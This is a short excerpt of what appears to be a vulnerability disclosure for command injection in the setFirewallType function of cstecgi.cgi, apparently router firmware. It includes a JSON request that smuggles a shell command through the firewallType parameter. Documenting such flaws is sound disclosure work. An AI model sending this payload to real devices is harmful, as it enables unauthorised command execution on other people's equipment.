...
The vulnerability is located in the function `sub_4107D4` within `cstecgi.cgi`, also known as `setFirewallType`.

![](Pasted%20image%2020231130003542.png)
...
therefore , by controlling parameter `firewallType` , we can finally make an arbitrary command execution
...
{"firewallType":"`id > /1.txt;`","topicurl":"setFirewallType","token":"00000000000000000000000000000000"}
~~~
...
![](Pasted%20image%2020231130003635.png)